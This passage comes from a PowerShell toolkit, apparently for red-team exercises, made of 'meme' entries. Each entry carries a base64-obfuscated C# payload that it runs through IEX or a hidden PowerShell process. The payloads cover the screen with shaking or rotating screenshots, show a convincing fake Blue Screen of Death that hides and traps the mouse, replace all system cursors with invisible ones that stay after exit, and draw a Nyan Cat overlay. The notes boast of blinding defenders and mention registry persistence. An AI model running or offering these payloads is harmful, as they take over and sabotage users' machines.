TcGVlZCkgJSAzNjBmOyB0aGlzLkludmFsaWRhdGUoKTsgfTsKICAgICAgICAgICAgc3BpblRpbWVyLlN0YXJ0KCk7CiAgICAgICAgfQogICAgICAgIHByb3RlY3RlZCBvdmVycmlkZSB2b2lkIE9uUGFpbnQoUGFpbnRFdmVudEFyZ3MgZSkgewogICAgICAgICAgICBHcmFwaGljcyBnID0gZS5HcmFwaGljczsgZy5DbGVhcihDb2xvci5CbGFjayk7CiAgICAgICAgICAgIGcuSW50ZXJwb2xhdGlvbk1vZGUgPSBJbnRlcnBvbGF0aW9uTW9kZS5Mb3c7IGcuU21vb3RoaW5nTW9kZSA9IFNtb290aGluZ01vZGUuSGlnaFNwZWVkOwogICAgICAgICAgICBmbG9hdCBjeCA9IHRoaXMuV2lkdGggLyAyZjsgZmxvYXQgY3kgPSB0aGlzLkhlaWdodCAvIDJmOwogICAgICAgICAgICBnLlRyYW5zbGF0ZVRyYW5zZm9ybShjeCwgY3kpOyBnLlJvdGF0ZVRyYW5zZm9ybShjdXJyZW50QW5nbGUpOyBnLlNjYWxlVHJhbnNmb3JtKDEuNWYsIDEuNWYpOwogICAgICAgICAgICBnLkRyYXdJbWFnZShzY3JlZW5DYXAsIC1jeCwgLWN5LCB0aGlzLldpZHRoLCB0aGlzLkhlaWdodCk7CiAgICAgICAgfQogICAgICAgIHByb3RlY3RlZCBvdmVycmlkZSB2b2lkIE9uS2V5RG93bihLZXlFdmVudEFyZ3MgZSkgewogICAgICAgICAgICBpZiAoZS5Db250cm9sICYmIGUuU2hpZnQgJiYgZS5LZXlDb2RlID09IEtleXMuUSkgeyBzcGluVGltZXIuU3RvcCgpOyB0aGlzLkNsb3NlKCk7IH0KICAgICAgICAgICAgYmFzZS5PbktleURvd24oZSk7CiAgICAgICAgfQogICAgICAgIHByb3RlY3RlZCBvdmVycmlkZSBDcmVhdGVQYXJhbXMgQ3JlYXRlUGFyYW1zIHsgZ2V0IHsgQ3JlYXRlUGFyYW1zIGNwID0gYmFzZS5DcmVhdGVQYXJhbXM7IGNwLkV4U3R5bGUgfD0gV1NfRVhfVE9PTFdJTkRPVzsgcmV0dXJuIGNwOyB9IH0KICAgIH0KfQoiQApBZGQtVHlwZSAtVHlwZURlZmluaXRpb24gJGNvZGUgLVJlZmVyZW5jZWRBc3NlbWJsaWVzIFN5c3RlbS5XaW5kb3dzLkZvcm1zLFN5c3RlbS5EcmF3aW5nIC1FcnJvckFjdGlvbiBTdG9wCltTeXN0ZW0uV2luZG93cy5Gb3Jtcy5BcHBsaWNhdGlvbl06OlJ1bigoTmV3LU9iamVjdCBXYXNoaW5nTWFjaGluZS5TcGluRm9ybSkp')));Start-Process powershell "-NoP -NonI -File `"$_f`"" -WindowStyle Normal'
        Notes = 'Captures the desktop before covering it, so the screenshot is always of the real desktop state at deployment time. Scale 1.5x prevents black corners during rotation. INTERACTIVE SESSION ONLY — use -Persist registry. No external assets required. Kill switch: Ctrl+Shift+Q. Validated by red team (see New_memes.txt).'
    }

    'MEME-011' = @{
        Desc  = 'Screen Earthquake — captures desktop screenshot and shakes it violently at ±25px random offsets at 60fps. Fullscreen topmost, hidden from Alt-Tab. Ctrl+Shift+Q to kill.'
        Cmd   = '$_f="$env:TEMP\meme011_quake.ps1";[IO.File]::WriteAllText($_f,[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uV2luZG93cy5Gb3JtcwpBZGQtVHlwZSAtQXNzZW1ibHlOYW1lIFN5c3RlbS5EcmF3aW5nCiRjb2RlID0gQCIKdXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uRHJhd2luZzsKdXNpbmcgU3lzdGVtLldpbmRvd3MuRm9ybXM7CnVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsKbmFtZXNwYWNlIEVhcnRocXVha2UgewogICAgcHVibGljIGNsYXNzIFNoYWtlRm9ybSA6IEZvcm0gewogICAgICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiKV0gc3RhdGljIGV4dGVybiBib29sIFNldFdpbmRvd1BvcyhJbnRQdHIgaFduZCwgSW50UHRyIGhXbmRJbnNlcnRBZnRlciwgaW50IFgsIGludCBZLCBpbnQgY3gsIGludCBjeSwgdWludCB1RmxhZ3MpOwogICAgICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiKV0gc3RhdGljIGV4dGVybiBpbnQgU2V0V2luZG93TG9uZyhJbnRQdHIgaFduZCwgaW50IG5JbmRleCwgaW50IGR3TmV3TG9uZyk7CiAgICAgICAgW0RsbEltcG9ydCgidXNlcjMyLmRsbCIpXSBzdGF0aWMgZXh0ZXJuIGludCBHZXRXaW5kb3dMb25nKEludFB0ciBoV25kLCBpbnQgbkluZGV4KTsKICAgICAgICBzdGF0aWMgcmVhZG9ubHkgSW50UHRyIEhXTkRfVE9QTU9TVCA9IG5ldyBJbnRQdHIoLTEpOwogICAgICAgIGNvbnN0IGludCBHV0xfRVhTVFlMRSA9IC0yMDsgY29uc3QgaW50IFdTX0VYX1RPT0xXSU5ET1cgPSAweDAwMDAwMDgwOwogICAgICAgIHByaXZhdGUgVGltZXIgcXVha2VUaW1lcjsgcHJpdmF0ZSBCaXRtYXAgc2NyZWVuQ2FwOwogICAgICAgIHByaXZhdGUgUmFuZG9tIHJuZyA9IG5ldyBSYW5kb20oKTsgcHJpdmF0ZSBpbnQgaW50ZW5zaXR5ID0gMjU7CiAgICAgICAgcHVibGljIFNoYWtlRm9ybSgpIHsKICAgICAgICAgICAgdGhpcy5Gb3JtQm9yZGVyU3R5bGUgPSBGb3JtQm9yZGVyU3R5bGUuTm9uZTsgdGhpcy5TaG93SW5UYXNrYmFyID0gZmFsc2U7CiAgICAgICAgICAgIHRoaXMuRG91YmxlQnVmZmVyZWQgPSB0cnVlOyB0aGlzLlRvcE1vc3QgPSB0cnVlOwogICAgICAgICAgICBSZWN0YW5nbGUgdG90YWwgPSBSZWN0YW5nbGUuRW1wdHk7CiAgICAgICAgICAgIGZvcmVhY2ggKFNjcmVlbiBzIGluIFNjcmVlbi5BbGxTY3JlZW5zKSB0b3RhbCA9IFJlY3RhbmdsZS5Vbmlvbih0b3RhbCwgcy5Cb3VuZHMpOwogICAgICAgICAgICB0aGlzLkJvdW5kcyA9IHRvdGFsOwogICAgICAgICAgICBzY3JlZW5DYXAgPSBuZXcgQml0bWFwKHRvdGFsLldpZHRoLCB0b3RhbC5IZWlnaHQpOwogICAgICAgICAgICB1c2luZyAoR3JhcGhpY3MgZyA9IEdyYXBoaWNzLkZyb21JbWFnZShzY3JlZW5DYXApKSBnLkNvcHlGcm9tU2NyZWVuKHRvdGFsLkxvY2F0aW9uLCBQb2ludC5FbXB0eSwgdG90YWwuU2l6ZSk7CiAgICAgICAgICAgIGludCBleFN0eWxlID0gR2V0V2luZG93TG9uZyh0aGlzLkhhbmRsZSwgR1dMX0VYU1RZTEUpOwogICAgICAgICAgICBTZXRXaW5kb3dMb25nKHRoaXMuSGFuZGxlLCBHV0xfRVhTVFlMRSwgZXhTdHlsZSB8IFdTX0VYX1RPT0xXSU5ET1cpOwogICAgICAgICAgICBTZXRXaW5kb3dQb3ModGhpcy5IYW5kbGUsIEhXTkRfVE9QTU9TVCwgMCwgMCwgMCwgMCwgMHgwMDAxIHwgMHgwMDAyKTsKICAgICAgICAgICAgcXVha2VUaW1lciA9IG5ldyBUaW1lcigpOyBxdWFrZVRpbWVyLkludGVydmFsID0gMTY7CiAgICAgICAgICAgIHF1YWtlVGltZXIuVGljayArPSAocywgZSkgPT4gdGhpcy5JbnZhbGlkYXRlKCk7IHF1YWtlVGltZXIuU3RhcnQoKTsKICAgICAgICB9CiAgICAgICAgcHJvdGVjdGVkIG92ZXJyaWRlIHZvaWQgT25QYWludChQYWludEV2ZW50QXJncyBlKSB7CiAgICAgICAgICAgIEdyYXBoaWNzIGcgPSBlLkdyYXBoaWNzOyBnLkNsZWFyKENvbG9yLkJsYWNrKTsKICAgICAgICAgICAgaW50IGR4ID0gcm5nLk5leHQoLWludGVuc2l0eSwgaW50ZW5zaXR5ICsgMSk7IGludCBkeSA9IHJuZy5OZXh0KC1pbnRlbnNpdHksIGludGVuc2l0eSArIDEpOwogICAgICAgICAgICBnLkRyYXdJbWFnZShzY3JlZW5DYXAsIGR4LCBkeSwgdGhpcy5XaWR0aCwgdGhpcy5IZWlnaHQpOwogICAgICAgIH0KICAgICAgICBwcm90ZWN0ZWQgb3ZlcnJpZGUgdm9pZCBPbktleURvd24oS2V5RXZlbnRBcmdzIGUpIHsKICAgICAgICAgICAgaWYgKGUuQ29udHJvbCAmJiBlLlNoaWZ0ICYmIGUuS2V5Q29kZSA9PSBLZXlzLlEpIHsgcXVha2VUaW1lci5TdG9wKCk7IHRoaXMuQ2xvc2UoKTsgfQogICAgICAgICAgICBiYXNlLk9uS2V5RG93bihlKTsKICAgICAgICB9CiAgICAgICAgcHJvdGVjdGVkIG92ZXJyaWRlIENyZWF0ZVBhcmFtcyBDcmVhdGVQYXJhbXMgeyBnZXQgeyBDcmVhdGVQYXJhbXMgY3AgPSBiYXNlLkNyZWF0ZVBhcmFtczsgY3AuRXhTdHlsZSB8PSBXU19FWF9UT09MV0lORE9XOyByZXR1cm4gY3A7IH0gfQogICAgfQp9CiJACkFkZC1UeXBlIC1UeXBlRGVmaW5pdGlvbiAkY29kZSAtUmVmZXJlbmNlZEFzc2VtYmxpZXMgU3lzdGVtLldpbmRvd3MuRm9ybXMsU3lzdGVtLkRyYXdpbmcgLUVycm9yQWN0aW9uIFN0b3AKW1N5c3RlbS5XaW5kb3dzLkZvcm1zLkFwcGxpY2F0aW9uXTo6UnVuKChOZXctT2JqZWN0IEVhcnRocXVha2UuU2hha2VGb3JtKSk=')));Start-Process powershell "-NoP -NonI -File `"$_f`"" -WindowStyle Normal'
        Notes = 'Visual chaos sibling to MEME-010. Gives the impression the entire OS is having a seizure. Same screenshot-overlay architecture as MEME-010 but shakes instead of rotates. INTERACTIVE SESSION ONLY — use -Persist registry. Kill switch: Ctrl+Shift+Q.'
    }

    'MEME-012' = @{
        Desc  = 'Fake BSOD (GDI pixel-perfect) — fullscreen Win10/11 Blue Screen of Death with real proportions, blank cursor via Win32 CreateCursor, mouse capture, and progress counter that crawls to 99% and stops. Ctrl+Shift+Q to kill.'
        Cmd   = '$_f="$env:TEMP\meme012_bsod.ps1";[IO.File]::WriteAllText($_f,[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uV2luZG93cy5Gb3JtcwpBZGQtVHlwZSAtQXNzZW1ibHlOYW1lIFN5c3RlbS5EcmF3aW5nCiRjb2RlID0gQCIKdXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uRHJhd2luZzsKdXNpbmcgU3lzdGVtLkRyYXdpbmcuVGV4dDsKdXNpbmcgU3lzdGVtLldpbmRvd3MuRm9ybXM7CnVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsKbmFtZXNwYWNlIERlZXBJbXBhY3QgewogICAgcHVibGljIGNsYXNzIEJTT0RGb3JtIDogRm9ybSB7CiAgICAgICAgW0RsbEltcG9ydCgidXNlcjMyLmRsbCIpXSBzdGF0aWMgZXh0ZXJuIGludCBTZXRXaW5kb3dMb25nKEludFB0ciBoV25kLCBpbnQgbkluZGV4LCBpbnQgZHdOZXdMb25nKTsKICAgICAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIildIHN0YXRpYyBleHRlcm4gaW50IEdldFdpbmRvd0xvbmcoSW50UHRyIGhXbmQsIGludCBuSW5kZXgpOwogICAgICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiKV0gc3RhdGljIGV4dGVybiBib29sIFNldFdpbmRvd1BvcyhJbnRQdHIgaFduZCwgSW50UHRyIGhXbmRJbnNlcnRBZnRlciwgaW50IFgsIGludCBZLCBpbnQgY3gsIGludCBjeSwgdWludCB1RmxhZ3MpOwogICAgICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiKV0gc3RhdGljIGV4dGVybiBJbnRQdHIgQ3JlYXRlQ3Vyc29yKEludFB0ciBoSW5zdCwgaW50IHhIb3RTcG90LCBpbnQgeUhvdFNwb3QsIGludCBuV2lkdGgsIGludCBuSGVpZ2h0LCBieXRlW10gcHZBTkRQbGFuZSwgYnl0ZVtdIHB2WE9SUGxhbmUpOwogICAgICAgIHN0YXRpYyByZWFkb25seSBJbnRQdHIgSFdORF9UT1BNT1NUID0gbmV3IEludFB0cigtMSk7CiAgICAgICAgY29uc3QgaW50IEdXTF9FWFNUWUxFID0gLTIwOyBjb25zdCBpbnQgV1NfRVhfVE9PTFdJTkRPVyA9IDB4MDAwMDAwODA7CiAgICAgICAgcHJpdmF0ZSBUaW1lciBwcm9ncmVzc1RpbWVyOyBwcml2YXRlIGludCBwY3QgPSAwOyBwcml2YXRlIFJhbmRvbSBybmcgPSBuZXcgUmFuZG9tKCk7CiAgICAgICAgcHVibGljIEJTT0RGb3JtKCkgewogICAgICAgICAgICB0aGlzLkZvcm1Cb3JkZXJTdHlsZSA9IEZvcm1Cb3JkZXJTdHlsZS5Ob25lOyB0aGlzLlNob3dJblRhc2tiYXIgPSBmYWxzZTsKICAgICAgICAgICAgdGhpcy5Ub3BNb3N0ID0gdHJ1ZTsgdGhpcy5Eb3VibGVCdWZmZXJlZCA9IHRydWU7CiAgICAgICAgICAgIHRoaXMuQmFja0NvbG9yID0gU3lzdGVtLkRyYXdpbmcuQ29sb3IuRnJvbUFyZ2IoMCwgMTIwLCAyMTUpOwogICAgICAgICAgICBieXRlW10gYW5kTWFzayA9IG5ldyBieXRlW10geyAweEZGIH07IGJ5dGVbXSB4b3JNYXNrID0gbmV3IGJ5dGVbXSB7IDB4MDAgfTsKICAgICAgICAgICAgSW50UHRyIGhDdXIgPSBDcmVhdGVDdXJzb3IoSW50UHRyLlplcm8sIDAsIDAsIDEsIDEsIGFuZE1hc2ssIHhvck1hc2spOwogICAgICAgICAgICBpZiAoaEN1ciAhPSBJbnRQdHIuWmVybykgdGhpcy5DdXJzb3IgPSBuZXcgQ3Vyc29yKGhDdXIpOwogICAgICAgICAgICBSZWN0YW5nbGUgdG90YWwgPSBSZWN0YW5nbGUuRW1wdHk7CiAgICAgICAgICAgIGZvcmVhY2ggKFNjcmVlbiBzIGluIFNjcmVlbi5BbGxTY3JlZW5zKSB0b3RhbCA9IFJlY3RhbmdsZS5Vbmlvbih0b3RhbCwgcy5Cb3VuZHMpOwogICAgICAgICAgICB0aGlzLkJvdW5kcyA9IHRvdGFsOwogICAgICAgICAgICBpbnQgZXhTdHlsZSA9IEdldFdpbmRvd0xvbmcodGhpcy5IYW5kbGUsIEdXTF9FWFNUWUxFKTsKICAgICAgICAgICAgU2V0V2luZG93TG9uZyh0aGlzLkhhbmRsZSwgR1dMX0VYU1RZTEUsIGV4U3R5bGUgfCBXU19FWF9UT09MV0lORE9XKTsKICAgICAgICAgICAgU2V0V2luZG93UG9zKHRoaXMuSGFuZGxlLCBIV05EX1RPUE1PU1QsIDAsIDAsIDAsIDAsIDB4MDAwMSB8IDB4MDAwMik7CiAgICAgICAgICAgIEN1cnNvci5DbGlwID0gdGhpcy5Cb3VuZHM7CiAgICAgICAgICAgIHByb2dyZXNzVGltZXIgPSBuZXcgVGltZXIoKTsgcHJvZ3Jlc3NUaW1lci5JbnRlcnZhbCA9IDMwMDA7CiAgICAgICAgICAgIHByb2dyZXNzVGltZXIuVGljayArPSAocywgZSkgPT4geyBpZiAocGN0IDwgOTkpIHsgcGN0ICs9IHJuZy5OZXh0KDEsIDgpOyBpZiAocGN0ID4gOTkpIHBjdCA9IDk5OyB0aGlzLkludmFsaWRhdGUoKTsgfSB9OwogICAgICAgICAgICBwcm9ncmVzc1RpbWVyLlN0YXJ0KCk7CiAgICAgICAgfQogICAgICAgIHByb3RlY3RlZCBvdmVycmlkZSB2b2lkIE9uUGFpbnQoUGFpbnRFdmVudEFyZ3MgZSkgewogICAgICAgICAgICBHcmFwaGljcyBnID0gZS5HcmFwaGljczsgZy5UZXh0UmVuZGVyaW5nSGludCA9IFRleHRSZW5kZXJpbmdIaW50LkNsZWFyVHlwZUdyaWRGaXQ7CiAgICAgICAgICAgIGcuQ2xlYXIoU3lzdGVtLkRyYXdpbmcuQ29sb3IuRnJvbUFyZ2IoMCwgMTIwLCAyMTUpKTsKICAgICAgICAgICAgZmxvYXQgc2NhbGUgPSB0aGlzLkhlaWdodCAvIDEwODBmOyBCcnVzaCB3aGl0ZSA9IEJydXNoZXMuV2hpdGU7CiAgICAgICAgICAgIEZvbnQgc2FkRm9udCA9IG5ldyBGb250KCJTZWdvZSBVSSBMaWdodCIsIDEyMCAqIHNjYWxlKTsKICAgICAgICAgICAgZy5EcmF3U3RyaW5nKCI6KCIsIHNhZEZvbnQsIHdoaXRlLCAxODAgKiBzY2FsZSwgMjAwICogc2NhbGUpOwogICAgICAgICAgICBGb250IGJpZ0ZvbnQgPSBuZXcgRm9udCgiU2Vnb2UgVUkgTGlnaHQiLCAyOCAqIHNjYWxlKTsKICAgICAgICAgICAgZy5EcmF3U3RyaW5nKCJZb3VyIFBDIHJhbiBpbnRvIGEgcHJvYmxlbSBhbmQgbmVlZHMgdG8gcmVzdGFydC4gV2UncmUiLCBiaWdGb250LCB3aGl0ZSwgMTgwICogc2NhbGUsIDQ1MCAqIHNjYWxlKTsKICAgICAgICAgICAgZy5EcmF3U3RyaW5nKCJqdXN0IGNvbGxlY3Rpbmcgc29tZSBlcnJvciBpbmZvLCBhbmQgdGhlbiB3ZSdsbCByZXN0YXJ0IGZvciIsIGJpZ0ZvbnQsIHdoaXRlLCAxODAgKiBzY2FsZSwgNTAwICogc2NhbGUpOwogICAgICAgICAgICBnLkRyYXdTdHJpbmcoInlvdS4iLCBiaWdGb250LCB3aGl0ZSwgMTgwICogc2NhbGUsIDU1MCAqIHNjYWxlKTsKICAgICAgICAgICAgRm9udCBwY3RGb250ID0gbmV3IEZvbnQoIlNlZ29lIFVJIExpZ2h0IiwgMjQgKiBzY2FsZSk7CiAgICAgICAgICAgIGcuRHJhd1N0cmluZyhwY3QgKyAiJSBjb21wbGV0ZSIsIHBjdEZvbnQsIHdoaXRlLCAxODAgKiBzY2FsZSwgNjUwICogc2NhbGUpOwogICAgICAgICAgICBGb250IHNtYWxsRm9udCA9IG5ldyBGb250KCJTZWdvZSBVSSBMaWdodCIsIDE0ICogc2NhbGUpOwogICAgICAgICAgICBnLkRyYXdTdHJpbmcoIklmIHlvdSdkIGxpa2UgdG8ga25vdyBtb3JlLCB5b3UgY2FuIHNlYXJjaCBvbmxpbmUgbGF0ZXIgZm9yIHRoaXMgZXJyb3I6Iiwgc21hbGxGb250LCB3aGl0ZSwgMTgwICogc2NhbGUsIDc2MCAqIHNjYWxlKTsKICAgICAgICAgICAgZy5EcmF3U3RyaW5nKCJTdG9wIGNvZGU6IENSSVRJQ0FMX1BST0NFU1NfRElFRCIsIHNtYWxsRm9udCwgd2hpdGUsIDE4MCAqIHNjYWxlLCA3OTAgKiBzY2FsZSk7CiAgICAgICAgICAgIHNhZEZvbnQuRGlzcG9zZSgpOyBiaWdGb250LkRpc3Bvc2UoKTsgcGN0Rm9udC5EaXNwb3NlKCk7IHNtYWxsRm9udC5EaXNwb3NlKCk7CiAgICAgICAgfQogICAgICAgIHByb3RlY3RlZCBvdmVycmlkZSB2b2lkIE9uS2V5RG93bihLZXlFdmVudEFyZ3MgZSkgewogICAgICAgICAgICBpZiAoZS5Db250cm9sICYmIGUuU2hpZnQgJiYgZS5LZXlDb2RlID09IEtleXMuUSkgeyBDdXJzb3IuQ2xpcCA9IFJlY3RhbmdsZS5FbXB0eTsgcHJvZ3Jlc3NUaW1lci5TdG9wKCk7IHRoaXMuQ2xvc2UoKTsgfQogICAgICAgICAgICBiYXNlLk9uS2V5RG93bihlKTsKICAgICAgICB9CiAgICAgICAgcHJvdGVjdGVkIG92ZXJyaWRlIENyZWF0ZVBhcmFtcyBDcmVhdGVQYXJhbXMgeyBnZXQgeyBDcmVhdGVQYXJhbXMgY3AgPSBiYXNlLkNyZWF0ZVBhcmFtczsgY3AuRXhTdHlsZSB8PSBXU19FWF9UT09MV0lORE9XOyByZXR1cm4gY3A7IH0gfQogICAgfQp9CiJACkFkZC1UeXBlIC1UeXBlRGVmaW5pdGlvbiAkY29kZSAtUmVmZXJlbmNlZEFzc2VtYmxpZXMgU3lzdGVtLldpbmRvd3MuRm9ybXMsU3lzdGVtLkRyYXdpbmcgLUVycm9yQWN0aW9uIFN0b3AKW1N5c3RlbS5XaW5kb3dzLkZvcm1zLkFwcGxpY2F0aW9uXTo6UnVuKChOZXctT2JqZWN0IERlZXBJbXBhY3QuQlNPREZvcm0pKQ==')));Start-Process powershell "-NoP -NonI -File `"$_f`"" -WindowStyle Normal'
        Notes = 'Superior replacement for the MessageBox-based MEME-001. Looks completely real — Segoe UI Light font, correct Windows blue (#0078D7), sad face, stop code, percentage crawl. Mouse cursor is replaced with a 1x1 blank via Win32 CreateCursor (not just hidden — actually invisible). Cursor.Clip captures the mouse. Kill switch releases clip before closing. INTERACTIVE SESSION ONLY — use -Persist registry.'
    }

    'MEME-013' = @{
        Desc  = 'Invisible Cursor — replaces all 13 system cursor types (normal, I-beam, wait, resize, hand, etc.) with a 1x1 fully transparent icon via SetSystemCursor. Persists across all applications until logoff or Restore() call.'
        Cmd   = '[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGNvZGUgPSBAIgp1c2luZyBTeXN0ZW07CnVzaW5nIFN5c3RlbS5EcmF3aW5nOwp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7Cm5hbWVzcGFjZSBDdXJzb3JWYW5pc2ggewogICAgcHVibGljIGNsYXNzIEdob3N0Q3Vyc29yIHsKICAgICAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIildIHN0YXRpYyBleHRlcm4gYm9vbCBTZXRTeXN0ZW1DdXJzb3IoSW50UHRyIGhjdXIsIHVpbnQgaWQpOwogICAgICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiKV0gc3RhdGljIGV4dGVybiBJbnRQdHIgQ29weUljb24oSW50UHRyIGhJY29uKTsKICAgICAgICBzdGF0aWMgcmVhZG9ubHkgdWludFtdIGN1cnNvcklkcyA9IHsgMzI1MTIsMzI1MTMsMzI1MTQsMzI1MTUsMzI1MTYsMzI2NDIsMzI2NDMsMzI2NDQsMzI2NDUsMzI2NDYsMzI2NDgsMzI2NDksMzI2NTAgfTsKICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBWYW5pc2goKSB7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICBCaXRtYXAgYm1wID0gbmV3IEJpdG1hcCgzMiwgMzIpOwogICAgICAgICAgICAgICAgZm9yIChpbnQgeCA9IDA7IHggPCAzMjsgeCsrKSBmb3IgKGludCB5ID0gMDsgeSA8IDMyOyB5KyspIGJtcC5TZXRQaXhlbCh4LCB5LCBDb2xvci5Gcm9tQXJnYigwLDAsMCwwKSk7CiAgICAgICAgICAgICAgICBJbnRQdHIgaEljb24gPSBibXAuR2V0SGljb24oKTsgaW50IGNvdW50ID0gMDsKICAgICAgICAgICAgICAgIGZvcmVhY2ggKHVpbnQgaWQgaW4gY3Vyc29ySWRzKSB7IEludFB0ciBjb3B5ID0gQ29weUljb24oaEljb24pOyBpZiAoY29weSAhPSBJbnRQdHIuWmVybyAmJiBTZXRTeXN0ZW1DdXJzb3IoY29weSwgaWQpKSBjb3VudCsrOyB9CiAgICAgICAgICAgICAgICBibXAuRGlzcG9zZSgpOyByZXR1cm4gU3RyaW5nLkZvcm1hdCgiUmVwbGFjZWQgezB9L3sxfSBjdXJzb3IgdHlwZXMuIiwgY291bnQsIGN1cnNvcklkcy5MZW5ndGgpOwogICAgICAgICAgICB9IGNhdGNoIChFeGNlcHRpb24gZXgpIHsgcmV0dXJuICJFcnJvcjogIiArIGV4Lk1lc3NhZ2U7IH0KICAgICAgICB9CiAgICAgICAgW0RsbEltcG9ydCgidXNlcjMyLmRsbCIpXSBzdGF0aWMgZXh0ZXJuIGJvb2wgU3lzdGVtUGFyYW1ldGVyc0luZm8odWludCB1aUFjdGlvbiwgdWludCB1aVBhcmFtLCBJbnRQdHIgcHZQYXJhbSwgdWludCBmV2luSW5pKTsKICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBSZXN0b3JlKCkgeyBTeXN0ZW1QYXJhbWV0ZXJzSW5mbygweDAwNTcsIDAsIEludFB0ci5aZXJvLCAwKTsgcmV0dXJuICJDdXJzb3JzIHJlc3RvcmVkLiI7IH0KICAgIH0KfQoiQApBZGQtVHlwZSAtVHlwZURlZmluaXRpb24gJGNvZGUgLVJlZmVyZW5jZWRBc3NlbWJsaWVzIFN5c3RlbS5EcmF3aW5nIC1FcnJvckFjdGlvbiBTdG9wCltDdXJzb3JWYW5pc2guR2hvc3RDdXJzb3JdOjpWYW5pc2goKQ=='))|IEX'
        Notes = 'Not a fullscreen overlay — actually replaces system cursors OS-wide. Persists after the PS process exits. Blue team cannot see where they are clicking in any application. Restore: run [CursorVanish.GhostCursor]::Restore() or logoff. Pairs devastatingly with MEME-015 (Input Sabotage). SYSTEM CONTEXT OK for cursor replacement; effects visible to interactive user immediately. VALIDATED by red team.'
    }

    'MEME-014' = @{
        Desc  = 'Nyan Cat (GDI fullscreen) — pixel-art Nyan Cat with poptart body, animated legs/tail, rainbow trail, and twinkling stars. DVD-screensaver bounce. No external assets. Ctrl+Shift+Q to kill.'
        Cmd   = '$_f="$env:TEMP\meme014_nyan.ps1";[IO.File]::WriteAllText($_f,[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uV2luZG93cy5Gb3JtcwpBZGQtVHlwZSAtQXNzZW1ibHlOYW1lIFN5c3RlbS5EcmF3aW5nCiRjb2RlID0gQCIKdXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYzsKdXNpbmcgU3lzdGVtLkRyYXdpbmc7CnVzaW5nIFN5c3RlbS5XaW5kb3dzLkZvcm1zOwp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7Cm5hbWVzcGFjZSBOeWFuSW1wYWN0IHsKICAgIHB1YmxpYyBjbGFzcyBOeWFuRm9ybSA6IEZvcm0gewogICAgICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiKV0gc3RhdGljIGV4dGVybiBpbnQgU2V0V2luZG93TG9uZyhJbnRQdHIgaFduZCwgaW50IG5JbmRleCwgaW50IGR3TmV3TG9uZyk7CiAgICAgICAgW0RsbEltcG9ydCgidXNlcjMyLmRsbCIpXSBzdGF0aWMgZXh0ZXJuIGludCBHZXRXaW5kb3dMb25nKEludFB0ciBoV25kLCBpbnQgbkluZGV4KTsKICAgICAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIildIHN0YXRpYyBleHRlcm4gYm9vbCBTZXRXaW5kb3dQb3MoSW50UHRyIGhXbmQsIEludFB0ciBoV25kSW5zZXJ0QWZ0ZXIsIGludCBYLCBpbnQgWSwgaW50IGN4LCBpbnQgY3ksIHVpbnQgdUZsYWdzKTsKICAgICAgICBzdGF0aWMgcmVhZG9ubHkgSW50UHRyIEhXTkRfVE9QTU9TVCA9IG5ldyBJbnRQdHIoLTEpOwogICAgICAgIGNvbnN0IGludCBHV0xfRVhTVFlMRSA9IC0yMDsgY29uc3QgaW50IFdTX0VYX1RPT0xXSU5ET1cgPSAweDAwMDAwMDgwOwogICAgICAgIHByaXZhdGUgVGltZXIgYW5pbVRpbWVyOyBwcml2YXRlIGZsb2F0IGNhdFgsIGNhdFk7IHByaXZhdGUgZmxvYXQgZHg9NGYsZHk9M2Y7CiAgICAgICAgcHJpdmF0ZSBpbnQgY2F0Vz03MCxjYXRIPTUwOyBwcml2YXRlIGZsb2F0IHBpeGVsU2NhbGU9NGY7CiAgICAgICAgcHJpdmF0ZSBMaXN0PFBvaW50Rj4gdHJhaWw9bmV3IExpc3Q8UG9pbnRGPigpOyBwcml2YXRlIGludCBtYXhUcmFpbD0yMDA7IHByaXZhdGUgaW50IGZyYW1lPTA7CiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgcmVhZG9ubHkgQ29sb3JbXSByYWluYm93PXtDb2xvci5Gcm9tQXJnYigyNTUsMCwwKSxDb2xvci5Gcm9tQXJnYigyNTUsMTUzLDApLENvbG9yLkZyb21BcmdiKDI1NSwyNTUsMCksQ29sb3IuRnJvbUFyZ2IoNTEsMjU1LDApLENvbG9yLkZyb21BcmdiKDAsMTUzLDI1NSksQ29sb3IuRnJvbUFyZ2IoMTAyLDUxLDI1NSl9OwogICAgICAgIHByaXZhdGUgc3RhdGljIHJlYWRvbmx5IENvbG9yIHRhcnQ9Q29sb3IuRnJvbUFyZ2IoMjU1LDIxMCwxNDApLHRhcnRFZGdlPUNvbG9yLkZyb21BcmdiKDIxMCwxNjAsMTAwKSxwaW5rPUNvbG9yLkZyb21BcmdiKDI1NSwxNTMsMjA0KSxkYXJrR3JheT1Db2xvci5Gcm9tQXJnYig1MCw1MCw1MCk7CiAgICAgICAgcHVibGljIE55YW5Gb3JtKCkgewogICAgICAgICAgICB0aGlzLkZvcm1Cb3JkZXJTdHlsZT1Gb3JtQm9yZGVyU3R5bGUuTm9uZTs